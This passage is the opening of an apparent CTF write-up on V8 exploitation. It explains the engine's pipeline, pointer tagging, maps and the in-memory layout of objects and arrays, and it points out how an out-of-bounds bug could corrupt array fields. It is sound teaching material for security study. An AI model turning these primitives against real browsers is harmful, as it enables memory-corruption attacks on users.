href=#caged-arbitrary-read--write>Caged arbitrary read & write</a></li><li><a href=#code-execution-through-wasm-shellcode-smuggling>Code execution through WASM shellcode smuggling</a></li></ul></li></ul></li></ul></nav></div></details></div></div><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/1*I_8q2ZRd5ZZJpBA4d36uDQ.jpeg alt></figure></p><p>This is a V8 exploitation introduction, where I explain the basic internals of the chrome javascript engine and apply that knowledge to solve the Vow Breaker ctf challenge from NexHunt CTF 2025.</p><p>This article is targeted towards pwners looking to get into V8 exploitation, basic GDB and low-level knowledge is assumed.</p><p>Building V8 is not covered in this article, I recommend checking the <a href=https://v8.dev/docs/build target=_blank rel=noreferrer>official docs</a> for doing so.</p><p>If there are any questions feel free to contact me on my socials, I would love to talk about it.</p><h2 class="relative group">V8 Internals<div id=v8-internals class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#v8-internals aria-label=Anchor>#</a></span></h2><blockquote><p><em>V8 is Google’s open source high-performance JavaScript and WebAssembly engine, written in C++.</em></p></blockquote><p>In this section I will explore:</p><ol><li>The lifecycle of a javascript program</li><li>Pointer tagging & compression</li><li>How V8 tracks the type of dynamic objects in the heap</li></ol><p>This section covers more than what is strictly necessary for the walkthrough because V8 bugs can be found in all of its subsystems, from its parser to its JIT compilers, therefore I believe a basic overarching introduction covering (most of) the engine is necessary.</p><h3 class="relative group">Lifecycle of a javascript program<div id=lifecycle-of-a-javascript-program class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#lifecycle-of-a-javascript-program aria-label=Anchor>#</a></span></h3><p>This is the javascript file I’ll be using as an example</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>function</span> <span class=nx>add</span><span class=p>(</span><span class=nx>x</span><span class=p>,</span> <span class=nx>y</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>x</span> <span class=o>+</span> <span class=nx>y</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>add</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=mi>3</span><span class=p>);</span></span></span></code></pre></div></div><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/1*mdxZYKBKzv81m87mWNN1LA.png alt></figure></p><p>Everything starts from the code, it gets analyzed by the lexer and transformed into a series of tokens the parser can understand. The tokens are the smallest unit of code that have meaning in javascript, as an example:</p><p><code>var x = 1</code> when reduced by the lexer becomes <code>var</code>, <code>x</code>, <code>=</code>, <code>1</code></p><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/1*saZWIyoJ-aqrf5oJ1prToA.png alt></figure></p><p>These tokens get fed into the parser which uses them to build an abstract syntax tree. An abstract syntax tree is a simpler representation of the code that the bytecode builder can understand and use.</p><p>The AST can be printed when running V8 with <code>--print-ast</code></p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>--- AST ---
</span></span><span class=line><span class=cl>FUNC at 12
</span></span><span class=line><span class=cl>. KIND 0
</span></span><span class=line><span class=cl>. LITERAL ID 1
</span></span><span class=line><span class=cl>. SUSPEND COUNT 0
</span></span><span class=line><span class=cl>. NAME &#34;add&#34;
</span></span><span class=line><span class=cl>. INFERRED NAME &#34;&#34;
</span></span><span class=line><span class=cl>. PARAMS
</span></span><span class=line><span class=cl>. . VAR (0x3eec01660470) (mode = VAR, assigned = false) &#34;x&#34;
</span></span><span class=line><span class=cl>. . VAR (0x3eec016604f0) (mode = VAR, assigned = false) &#34;y&#34;
</span></span><span class=line><span class=cl>. DECLS
</span></span><span class=line><span class=cl>. . VARIABLE (0x3eec01660470) (mode = VAR, assigned = false) &#34;x&#34;
</span></span><span class=line><span class=cl>. . VARIABLE (0x3eec016604f0) (mode = VAR, assigned = false) &#34;y&#34;
</span></span><span class=line><span class=cl>. RETURN at 22
</span></span><span class=line><span class=cl>. . kAdd at 31
</span></span><span class=line><span class=cl>. . . VAR PROXY parameter[0] (0x3eec01660470) (mode = VAR, assigned = false) &#34;x&#34;
</span></span><span class=line><span class=cl>. . . VAR PROXY parameter[1] (0x3eec016604f0) (mode = VAR, assigned = false) &#34;y&#34;</span></span></code></pre></div></div><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/1*k-QeEgqdvjjh3mYWrU4Fpg.png alt></figure></p><p>In most cases this is the last step of the V8 pipeline, the bytecode gets generated from the AST and sent to the interpreter to be executed.</p><p>The bytecode can also be displayed with <code>--print-bytecode</code></p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>         0x2a1c010000e4 @    0 : 0b 04             Ldar a1
</span></span><span class=line><span class=cl>         0x2a1c010000e6 @    2 : 40 03 00          Add a0, FBV[0]
</span></span><span class=line><span class=cl>         0x2a1c010000e9 @    5 : b7                Return</span></span></code></pre></div></div><p>The interpreter (named Ignition) is a register-based virtual machine with an accumulator register, understanding the bytecode and the interpreter in detail is out of the scope of this article.</p><p>If the function gets “hot”, in other words, reaches a certain number of executions it enters the optimization pipeline.</p><p>V8 has 3 JIT compilers, each with its own objective:</p><ol><li>Sparkplug: A non-optimizing compiler that is designed to compile machine code very fast (Called when the function reaches ~10–100 calls)</li><li>Maglev: A mid-tier compiler that balances producing optimized machine code and fast compilation times (~100–1000 calls)</li><li>Turbofan: The flagship compiler that produces highly optimized machine code (~1000+ calls)</li></ol><p>As an exploiter, a JIT compiler is one of the most interesting attack surfaces due to its ability to compile and run machine code.</p><h3 class="relative group">How are objects stored in memory?<div id=how-are-objects-stored-in-memory class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#how-are-objects-stored-in-memory aria-label=Anchor>#</a></span></h3><p>Javascript is a dynamically typed language, this means the engine must store type information with every runtime value. It is done efficiently through something called a map (or a shape (or a hidden class)) and pointer tagging.</p><p>First, let’s examine V8’s type system. <a href=https://chromium.googlesource.com/v8/v8/+/4.4-lkgr/src/objects.h target=_blank rel=noreferrer>The type inheritence tree</a> looks a bit like this:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Object
</span></span><span class=line><span class=cl> - SMI (Small Integer)
</span></span><span class=line><span class=cl> - HeapObject
</span></span><span class=line><span class=cl> - - Map
</span></span><span class=line><span class=cl> - - JSReceiver
</span></span><span class=line><span class=cl> - - - JSObject
</span></span><span class=line><span class=cl> - - - - JSArray
</span></span><span class=line><span class=cl> - - - - JSPromise</span></span></code></pre></div></div><p>This isn’t exhaustive, but covers the key types for our discussion.</p><p>SMIs are 31 bit integers stored in-line in memory, HeapObjects represent javascript object that are stored in the JS heap.</p><p>V8 uses a custom pointer tagging scheme: the least significant bit represents whether a value is an SMI or a HeapObject pointer. And in the case of pointers the second least significant bit represents whether it is a strong pointer (indicates that the referenced object is and must remain in memory) or a weak pointer (the referenced object might have been deleted).</p><p>SMIs have their least significant bit always set to zero while HeapObject pointers always have theirs set to one. The reason V8 uses this scheme is for fast garbage collection.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>             |----- 32 bits -----|----- 32 bits -----|
</span></span><span class=line><span class=cl> Pointer:    |________base_______|______offset_____w1|
</span></span><span class=line><span class=cl> Smi:        |......garbage......|____int31_value___0|
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>where w is the bit encoding the &#39;weakness&#39; of the pointer.</span></span></code></pre></div></div><p>The pointers are split into two 32 bits slices due to <a href=https://v8.dev/blog/pointer-compression target=_blank rel=noreferrer>V8’s pointer compression</a>.</p><p>The engine stores only the 32 bit pointer offsets in the JS heap, and keeps the 32 bit base in a register. This allows for more efficient memory usage in the heap, and also acts a security barrier with the help of Ubercage, V8’s sandbox.</p><h3 class="relative group">Type metadata in V8<div id=type-metadata-in-v8 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#type-metadata-in-v8 aria-label=Anchor>#</a></span></h3><p>V8 is built with c++, a statically typed language. To keep track of the type of dynamic objects in javascript in runtime, V8 stores type metadata on the heap with the help of the <a href=https://v8.dev/docs/hidden-classes target=_blank rel=noreferrer>Map object</a>.</p><p>A map is a data structure containing key information about the object, such as its:</p><ul><li>Type</li><li>Size in bytes</li><li>Properties (and where they are stored)</li><li>Type of its elements</li></ul><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/1*OxiTutjAWX0zHnwDXafB9w.png alt></figure></p><p>A map in action</p><p>Why have such a complicated way of tracking metadata?</p><p>V8 assumes developers create a limited number of object types that are reused in predictable ways. Maps allow the engine to be very efficient when objects are similar.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>obj1</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;foo&#39;</span><span class=o>:</span> <span class=mf>2.2</span><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>obj2</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;foo&#39;</span><span class=o>:</span> <span class=mf>4.1</span><span class=p>};</span> <span class=c1>// obj2 now shares the same map as obj1
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>obj3</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;foo&#39;</span><span class=o>:</span> <span class=mf>5.3</span><span class=p>,</span> <span class=s1>&#39;bar&#39;</span><span class=o>:</span> <span class=mf>1.1</span><span class=p>};</span> <span class=c1>// obj3&#39;s map is derived from obj1&#39;s map
</span></span></span><span class=line><span class=cl>                                     <span class=c1>// with an added bar property
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>obj2</span><span class=p>.</span><span class=nx>bar</span> <span class=o>=</span> <span class=mf>5.5</span><span class=p>;</span> <span class=c1>// Now obj2 shares the same map as obj3, this is called a map
</span></span></span><span class=line><span class=cl>                <span class=c1>// transition and it can one way only, these transitions allow
</span></span></span><span class=line><span class=cl>                <span class=c1>// the engine to be very efficient with map allocations
</span></span></span></code></pre></div></div><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/1*ldrClhEpahrbLaWeNcKpNg.png alt></figure></p><p>Map0 is the map of an empty object, the transitions are one-way only</p><h3 class="relative group">JSObject && JSArray<div id=jsobject--jsarray class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#jsobject--jsarray aria-label=Anchor>#</a></span></h3><p>This is arguably the most important part of this section.</p><p>I will examine what an object and an array look like in memory, and see the difference between them both.</p><p>I will be using the <code>%DebugPrint();</code> function, so make sure to run v8 with the <code>--allow-natives-syntax</code> flag.</p><p>When debugging I also run V8 with the <code>--shell</code> flag to keep it running.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>obj</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;a&#39;</span><span class=o>:</span> <span class=mf>3.5</span><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>obj</span><span class=p>);</span></span></span></code></pre></div></div><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>DebugPrint: 0x28bf01084055: [JS_OBJECT_TYPE]
</span></span><span class=line><span class=cl> - map: 0x28bf01018029 &lt;Map[16](HOLEY_ELEMENTS)&gt; [FastProperties]
</span></span><span class=line><span class=cl> - prototype: 0x28bf01003fa5 &lt;Object map = 0x28bf01003321&gt;
</span></span><span class=line><span class=cl> - elements: 0x28bf000007bd &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
</span></span><span class=line><span class=cl> - properties: 0x28bf000007bd &lt;FixedArray[0]&gt;
</span></span><span class=line><span class=cl> - All own properties (excluding elements): {
</span></span><span class=line><span class=cl>    0x28bf000034cd: [String] in ReadOnlySpace: #a: 0x28bf01084085 &lt;HeapNumber 3.5&gt; (const data field 0, attrs: [WEC]) @ Any, location: in-object
</span></span><span class=line><span class=cl> }
</span></span><span class=line><span class=cl>0x28bf01018029: [Map] in OldSpace
</span></span><span class=line><span class=cl> - map: 0x28bf01002db9 &lt;MetaMap (0x28bf01002e09 &lt;NativeContext[302]&gt;)&gt;
</span></span><span class=line><span class=cl> - type: JS_OBJECT_TYPE
</span></span><span class=line><span class=cl> - instance size: 16
</span></span><span class=line><span class=cl> - inobject properties: 1
</span></span><span class=line><span class=cl> - unused property fields: 0
</span></span><span class=line><span class=cl> - elements kind: HOLEY_ELEMENTS
</span></span><span class=line><span class=cl> - enum length: invalid
</span></span><span class=line><span class=cl> - stable_map
</span></span><span class=line><span class=cl> - back pointer: 0x28bf01018001 &lt;Map[16](HOLEY_ELEMENTS)&gt;
</span></span><span class=line><span class=cl> - prototype_validity_cell: 0x28bf00000ac9 &lt;Cell value= [cleared]&gt;
</span></span><span class=line><span class=cl> - instance descriptors (own) #1: 0x28bf01084065 &lt;DescriptorArray[1]&gt;
</span></span><span class=line><span class=cl> - prototype: 0x28bf01003fa5 &lt;Object map = 0x28bf01003321&gt;
</span></span><span class=line><span class=cl> - constructor: 0x28bf01003839 &lt;JSFunction Object (sfi = 0x28bf000658b1)&gt;
</span></span><span class=line><span class=cl> - dependent code: 0x28bf000007cd &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;
</span></span><span class=line><span class=cl> - construction counter: 0</span></span></code></pre></div></div><p>Let’s focus on the object for now instead of the map:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>DebugPrint: 0x28bf01084055: [JS_OBJECT_TYPE]
</span></span><span class=line><span class=cl> - map: 0x28bf01018029 &lt;Map[16](HOLEY_ELEMENTS)&gt; [FastProperties]
</span></span><span class=line><span class=cl> - prototype: 0x28bf01003fa5 &lt;Object map = 0x28bf01003321&gt;
</span></span><span class=line><span class=cl> - elements: 0x28bf000007bd &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
</span></span><span class=line><span class=cl> - properties: 0x28bf000007bd &lt;FixedArray[0]&gt;
</span></span><span class=line><span class=cl> - All own properties (excluding elements): {
</span></span><span class=line><span class=cl>    0x28bf000034cd: [String] in ReadOnlySpace: #a: 0x28bf01084085 &lt;HeapNumber 3.5&gt; (const data field 0, attrs: [WEC]) @ Any, location: in-object
</span></span><span class=line><span class=cl> }</span></span></code></pre></div></div><p>A JSObject has 4 fields, all of which are pointers:</p><ol><li>A map.</li><li>The prototype of the object. It contains the properties that are not on the JSObject. It follows the concept of a ‘prototype chain’. If V8 does not find the property in the object itself it searches its prototype for it, the prototype also has a prototype field, this search keeps on going recursively until V8 either finds the property or reaches the end of the prototype chain and returns null.</li><li>The elements field. It contains a pointer to where the ‘indexed properties’ of the objects are located at. In this case (no indexed elements) the elements and the properties fields point to the same area.</li><li>The properties field. It contains a pointer to where the ‘named properties’ of the object are in memory.</li></ol><p>Indexed properties are properties accessible with an integer index, Named properties are accessible with a string key.</p><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/0*US7xDsg5ADhbaW1s.png alt title="Source: https://v8.dev/blog/fast-properties"><figcaption>Source: https://v8.dev/blog/fast-properties</figcaption></figure></p><p>The named properties further branch out into different kinds of named properties: in-object, fast and slow.</p><p>In-object properties are stored directly on the object itself. They are the fastest kind of properties in v8 that are accessible directly. Their number is limited by the size of the object.</p><p>Fast properties are stored in a properties store (an array). They are accessed linearly with an index. To get the index of a named property in the property store, it is necessary to check the map of the object (Also called the hidden class).</p><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/0*EwaZR43conuv2WEC.png alt title="Source: https://v8.dev/blog/fast-properties"><figcaption>Source: https://v8.dev/blog/fast-properties</figcaption></figure></p><p>Lastly slow properties are stored in a dictionary. This is done when a lot of properties gets added and deleted from the object. This causes a lot of memory and time overhead so the engine switches to storing the properties in a self-contained dictionnary.</p><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/0*EgNytwsqAbmCIh3I.png alt title="Source: https://v8.dev/blog/fast-properties"><figcaption>Source: https://v8.dev/blog/fast-properties</figcaption></figure></p><p>Indexed properties also branch out into many different sub-types (over 20+!) I will only cover the most important ones.</p><p>The first distinction the engine makes is whether the elements backing store is PACKED or HOLEY. If an indexed element is not defined or it is deleted, it is represented as a ‘hole’. ‘the_hole’ is a special value in V8 used to mark properties that are not present. If the engine encounters ‘the_hole’ it travels further up the prototype chain to look for the property.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>o</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>,</span> <span class=s1>&#39;b&#39;</span><span class=p>,</span> <span class=s1>&#39;c&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>delete</span> <span class=nx>o</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nx>o</span><span class=p>.</span><span class=nx>__proto__</span> <span class=o>=</span> <span class=p>{</span><span class=mi>1</span><span class=o>:</span> <span class=s1>&#39;B&#39;</span><span class=p>};</span></span></span></code></pre></div></div><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/0*abwlTj23Rk78xBVx.png alt title="Source: https://v8.dev/blog/fast-properties"><figcaption>Source: https://v8.dev/blog/fast-properties</figcaption></figure></p><p>If an array contains no holes it considered PACKED: the engine knows it can access all the properties locally with no costly prototype lookups.</p><p>The second distinction it makes is for the type of the elements: I’m only interested in these two: SMIs and DOUBLES</p><p>V8 starts out with the most specialized type of array moving to a more general form once the type of the elements change.</p><p>ELEMENTS is the given type of the array if it contains any value which cannot be represented as SMI or a DOUBLE or if it contains mixed types.</p><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/1*AI52OC_amRGIQPGux2ZLuQ.png alt title="Source: https://v8.dev/blog/elements-kinds"><figcaption>Source: https://v8.dev/blog/elements-kinds</figcaption></figure></p><p>It is possible to only go one way through the lattice.</p><p>Let’s see what arrays look like in javascript:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>arr</span> <span class=o>=</span> <span class=p>[</span><span class=mf>1.1</span><span class=p>,</span> <span class=mf>2.2</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>arr</span><span class=p>);</span></span></span></code></pre></div></div><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>DebugPrint: 0x52201084069: [JSArray]
</span></span><span class=line><span class=cl> - map: 0x05220100b4c9 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]
</span></span><span class=line><span class=cl> - prototype: 0x05220100ae2d &lt;JSArray[0]&gt;
</span></span><span class=line><span class=cl> - elements: 0x052201084051 &lt;FixedDoubleArray[2]&gt; [PACKED_DOUBLE_ELEMENTS]
</span></span><span class=line><span class=cl> - length: 2
</span></span><span class=line><span class=cl> - properties: 0x0522000007bd &lt;FixedArray[0]&gt;
</span></span><span class=line><span class=cl> - All own properties (excluding elements): {
</span></span><span class=line><span class=cl>    0x52200000df1: [String] in ReadOnlySpace: #length: 0x052200036799 &lt;AccessorInfo name= 0x052200000df1 &lt;String[6]: #length&gt;, data= 0x052200000011 &lt;undefined&gt;&gt; (const accessor descriptor, attrs: [W__]), location: descriptor
</span></span><span class=line><span class=cl> }
</span></span><span class=line><span class=cl> - elements: 0x052201084051 &lt;FixedDoubleArray[2]&gt; {
</span></span><span class=line><span class=cl>           0: 1.1 (0x3ff199999999999a)
</span></span><span class=line><span class=cl>           1: 2.2 (0x400199999999999a)
</span></span><span class=line><span class=cl> }</span></span></code></pre></div></div><p>There are two differences:</p><ul><li>A new length field, which directly corresponds to the array’s size. If this value is changed the array is automatically resized accordingly.</li><li>Floats are stored in-line in memory ! Objects store them using HeapNumbers (Another HeapObject type). This leads to some very interesting results if you can somehow trick v8 into believing an object is an array as it will be showcased later on in the exploitation section.</li></ul><p>That’s it! An array is basically a JSObject with some additional properties and a special length field.</p><p>Additionally let’s see what all of this looks like in-memory, let’s start with an object and to differentiate between the elements pointer and the properties pointer let’s add an indexed property.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>obj</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;a&#39;</span> <span class=o>:</span> <span class=mf>1.1</span><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=nx>obj</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mf>2.2</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>obj</span><span class=p>);</span></span></span></code></pre></div></div><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>DebugPrint: 0x2d2c01084061: [JS_OBJECT_TYPE]
</span></span><span class=line><span class=cl> - map: 0x2d2c01018039 &lt;Map[16](HOLEY_ELEMENTS)&gt; [FastProperties]
</span></span><span class=line><span class=cl> - prototype: 0x2d2c01003fa5 &lt;Object map = 0x2d2c01003321&gt;
</span></span><span class=line><span class=cl> - elements: 0x2d2c0108409d &lt;FixedArray[17]&gt; [HOLEY_ELEMENTS]
</span></span><span class=line><span class=cl> - properties: 0x2d2c000007bd &lt;FixedArray[0]&gt;
</span></span><span class=line><span class=cl> - All own properties (excluding elements): {
</span></span><span class=line><span class=cl>    0x2d2c000034cd: [String] in ReadOnlySpace: #a: 0x2d2c01084091 &lt;HeapNumber 1.1&gt; (const data field 0, attrs: [WEC]) @ Any, location: in-object
</span></span><span class=line><span class=cl> }
</span></span><span class=line><span class=cl> - elements: 0x2d2c0108409d &lt;FixedArray[17]&gt; {
</span></span><span class=line><span class=cl>           0: 0x2d2c01017fa5 &lt;HeapNumber 2.2&gt;
</span></span><span class=line><span class=cl>        1-16: 0x2d2c00020001 &lt;the_hole_value&gt;
</span></span><span class=line><span class=cl> }</span></span></code></pre></div></div><p>Notice how the float I added is stored as a HeapNumber ? keep this in mind for later.</p><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/1*fikE4JaW34dojDgtTBCMsw.png alt title="Always subtract one from tagged pointers."><figcaption>Always subtract one from tagged pointers.</figcaption></figure></p><p>These are the values present in-memory in the order shown:</p><ol><li>The map pointer offset</li><li>The properties pointer offset</li><li>The elements pointer offset</li><li>Inline properties’ pointer offset (in this case its 1.1 for ‘a’)</li></ol><p>Looking at the inline properties, there is a seemingly bizarre 0x515 value before our float (1.1 == 0x3ff199999999999a). This is the map of the HeapNumber. In V8 maps are always stored in-line with the fields of the objects.</p><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/1*PEpOMR_M9zVplavsL160-A.png alt title="The elements in-memory representation"><figcaption>The elements in-memory representation</figcaption></figure></p><p>Same as before, 0x5dd is the map address offset of the DescriptorArray storing the elements in memory.</p><p>0x22 is the length of this array, it is stored as an SMI so bit shifting it by 1 is necessary: 0x22 &#187; 1 = 0x11 = 17</p><p>After these two fields are our elements: the pointer to our float HeapNumber and the rest are the_hole values.</p><p><strong>Observation</strong>: our elements are stored 8 bytes after the elements pointer address</p><p>As a recap this is what everything looks like in memory:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Object: 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>4 bytes   | 4 bytes
</span></span><span class=line><span class=cl>-------------------
</span></span><span class=line><span class=cl>MAP       | PROPERTIES
</span></span><span class=line><span class=cl>ELEMENTS  | INLINE PROPERTIES
</span></span><span class=line><span class=cl>-------------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Elements: (Elements stored as pointers)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>4 bytes   | 4 bytes
</span></span><span class=line><span class=cl>-------------------
</span></span><span class=line><span class=cl>MAP       | BACKING ARRAY LENGTH
</span></span><span class=line><span class=cl>ELEMENT 1 | ELEMENT 2
</span></span><span class=line><span class=cl>....
</span></span><span class=line><span class=cl>....
</span></span><span class=line><span class=cl>-------------------</span></span></code></pre></div></div><p>Let’s do the same thing for an array this time:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>arr</span> <span class=o>=</span> <span class=p>[</span><span class=mf>1.1</span><span class=p>,</span> <span class=mf>2.2</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>arr</span><span class=p>);</span></span></span></code></pre></div></div><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>DebugPrint: 0x33af01084069: [JSArray]
</span></span><span class=line><span class=cl> - map: 0x33af0100b4c9 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]
</span></span><span class=line><span class=cl> - prototype: 0x33af0100ae2d &lt;JSArray[0]&gt;
</span></span><span class=line><span class=cl> - elements: 0x33af01084051 &lt;FixedDoubleArray[2]&gt; [PACKED_DOUBLE_ELEMENTS]
</span></span><span class=line><span class=cl> - length: 2
</span></span><span class=line><span class=cl> - properties: 0x33af000007bd &lt;FixedArray[0]&gt;
</span></span><span class=line><span class=cl> - All own properties (excluding elements): {
</span></span><span class=line><span class=cl>    0x33af00000df1: [String] in ReadOnlySpace: #length: 0x33af00036799 &lt;AccessorInfo name= 0x33af00000df1 &lt;String[6]: #length&gt;, data= 0x33af00000011 &lt;undefined&gt;&gt; (const accessor descriptor, attrs: [W__]), location: descriptor
</span></span><span class=line><span class=cl> }
</span></span><span class=line><span class=cl> - elements: 0x33af01084051 &lt;FixedDoubleArray[2]&gt; {
</span></span><span class=line><span class=cl>           0: 1.1 (0x3ff199999999999a)
</span></span><span class=line><span class=cl>           1: 2.2 (0x400199999999999a)
</span></span><span class=line><span class=cl> }</span></span></code></pre></div></div><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/1*A1dbv1nFGd8cCdLVRHchNQ.png alt></figure></p><p>These are the values present in-memory in the order shown:</p><ol><li>The map</li><li>Properties</li><li>Elements</li><li>Length of the array, 0x4 &#187; 1 = 0x2 = 2 (It is stored as an SMI)</li></ol><p>Press enter or click to view image in full size</p><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/1*mA-0Qid0H4YNtssviMLlaQ.png alt title=Elements><figcaption>Elements</figcaption></figure></p><p>Same as before: the first value is the map of the backing array holding the elements in memory, the second value is the length of this array stored as an SMI.</p><p>What is interesting is that the elements this time are stored directly in-memory and not as HeapNumber pointers.</p><p>Another thing is that the elements are stored <strong>before</strong> the array in memory.</p><p>This can lead to serious repercussions if for example there was an Out-Of-Bound bug that leads to overwriting an element right after the end of the array.</p><p>In other words it would allow us to directly modify the fields of the JSArray! In fact, this is what is often used to gain further exploitation primitives from a ‘simple’ OOB bug.</p><p><strong>Observation</strong>: The elements are located 0x8 bytes before the JSArray and 0x8 bytes after the elements pointer.</p><p>As a recap this is what everything looks like in memory:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>JSArray: 
</span></span><span class=line><span class=cl>4 bytes   | 4 bytes
</span></span><span class=line><span class=cl>-------------------
</span></span><span class=line><span class=cl>MAP       | PROPERTIES
</span></span><span class=line><span class=cl>ELEMENTS  | LENGTH
</span></span><span class=line><span class=cl>-------------------
</span></span><span class=line><span class=cl>Elements: (Elements stored as direct values) 
</span></span><span class=line><span class=cl>(0x18 bytes before the JSArray)
</span></span><span class=line><span class=cl>4 bytes   | 4 bytes
</span></span><span class=line><span class=cl>-------------------
</span></span><span class=line><span class=cl>MAP       | BACKING ARRAY LENGTH
</span></span><span class=line><span class=cl>       ELEMENT 1
</span></span><span class=line><span class=cl>       ELEMENT 2
</span></span><span class=line><span class=cl>....
</span></span><span class=line><span class=cl>....
